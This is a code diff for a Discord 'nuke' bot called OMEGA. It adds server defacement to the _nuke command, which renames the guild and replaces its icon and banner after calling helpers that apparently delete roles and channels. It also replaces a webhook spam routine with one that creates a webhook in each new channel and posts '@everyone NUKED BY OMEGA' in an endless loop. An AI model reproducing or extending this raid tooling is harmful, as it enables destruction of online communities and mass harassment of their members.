@@ -5,7 +5,7 @@ import aiohttp
 import aioconsole
 
 #Token here
-token = "BOT TOKEN HERE"
+token = ""
 prefix = "!"
 hook = True
 
@@ -15,7 +15,7 @@ bot = commands.Bot(command_prefix="!", case_insensitive=True,intents=discord.Int
 async def on_ready():
     await aioconsole.aprint(f"""
     ╔═════════════════════════╗
-    ║    𝗢𝗠𝗘𝗚𝗔 𝗦𝗘𝗟𝗙𝗕𝗢𝗧        ║  
+    ║    𝗢𝗠𝗘𝗚𝗔 𝗡𝗨𝗞𝗘           ║  
     ╚════════════╬════════════╝
     ╔════════════╬════════════╗
     ║  █▀█ █▀▄▀█ █▀▀ █▀▀ ▄▀█  ║
@@ -27,6 +27,10 @@ async def on_ready():
     LOGGED IN AS: {bot.user.name}#{bot.user.discriminator}
     BOT IS READY!
     """)
+
+global image
+with open('omega.gif', 'rb') as f:
+    image = f.read()
 
 
 
@@ -183,43 +187,41 @@ async def _nuke(ctx):
     await rd(ctx)
     await cc(ctx.guild.id)
     await rc(ctx.guild.id)
+    await ctx.guild.edit(
+        name="𝗢𝗠𝗘𝗚𝗔",
+        description="𝗢𝗠𝗘𝗚𝗔",
+        reason="𝗢𝗠𝗘𝗚𝗔",
+        icon=image,
+        banner=image
+    )
     await aioconsole.aprint("NUKE COMPLETE")
 
 
-async def spam(id, token):
-    async with aiohttp.ClientSession() as session:
-        tasks = []
-        for i in range(2):
-            task = asyncio.ensure_future(spammer(session, id, token))
-            tasks.append(task)
-        await asyncio.gather(*tasks)
+# async def spam(id, token):
+#     async with aiohttp.ClientSession() as session:
+#         tasks = []
+#         for i in range(2):
+#             task = asyncio.ensure_future(spammer(session, id, token))
+#             tasks.append(task)
+#         await asyncio.gather(*tasks)
 
-async def spammer(session, id, token):
-    async with session.post(f"https://discord.com/api/webhooks/{id}/{token}", json={'content':'@everyone 𝗡𝗨𝗞𝗘𝗗 𝗕𝗬 𝗢𝗠𝗘𝗚𝗔','username':'𝗢𝗠𝗘𝗚𝗔', 'avatar':'https://cdn.discordapp.com/attachments/918348753193283654/919751805280325702/omega.gif'}) as resp:
-        if resp.status == 204:
-            await aioconsole.aprint("Successfully sent a webhook message")
-        if resp.status == 429:
-            k = await resp.json()
-            await aioconsole.aprint(f"Ratelimited, waiting {k['retry_after']} seconds")
+# async def spammer(session, id, token):
+#     async with session.post(f"https://discord.com/api/webhooks/{id}/{token}", json={'content':'@everyone 𝗡𝗨𝗞𝗘𝗗 𝗕𝗬 𝗢𝗠𝗘𝗚𝗔','username':'𝗢𝗠𝗘𝗚𝗔', 'avatar':'https://cdn.discordapp.com/attachments/918348753193283654/919751805280325702/omega.gif'}) as resp:
+#         if resp.status == 204:
+#             await aioconsole.aprint("Successfully sent a webhook message")
+#         if resp.status == 429:
+#             k = await resp.json()
+#             await aioconsole.aprint(f"Ratelimited, waiting {k['retry_after']} seconds")
 
 
 #https://canary.discord.com/api/v9/channels/919719741919199353/webhooks
 @bot.event
 async def on_guild_channel_create(channel):
+    webhook = await channel.create_webhook(name="𝗢𝗠𝗘𝗚𝗔", avatar=image, reason="𝗢𝗠𝗘𝗚𝗔")
+    webhook_url = webhook.url
     async with aiohttp.ClientSession() as session:
-        async with session.post(f"https://canary.discord.com/api/v9/channels/{channel.id}/webhooks", headers={'authorization':f'Bot {token}'}, json={'name':'𝗢𝗠𝗘𝗚𝗔'}) as resp:
-            if resp.status == 200:
-                k = await resp.json()
-                await aioconsole.aprint("Successfully created a webhook")
-                webhook_id = k['id']
-                webhook_token = k['token']
-            if resp.status == 429:
-                k = await resp.json()
-                await aioconsole.aprint(f"Ratelimited, waiting {k['retry_after']} seconds")
-                async with session.post(f"https://canary.discord.com/api/v9/channels/{channel.id}/webhooks", headers={'authorization':f'Bot {token}'}, json={'name':'𝗢𝗠𝗘𝗚𝗔'}) as resp:
-                    if resp.status == 200:
-                        await aioconsole.aprint("Successfully created a webhook")
-    while True:
-        await spam(webhook_id, webhook_token)
+        webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
+        while True:
+            await webhook.send(f"@everyone 𝗡𝗨𝗞𝗘𝗗 𝗕𝗬 𝗢𝗠𝗘𝗚𝗔")
 
 bot.run(token)
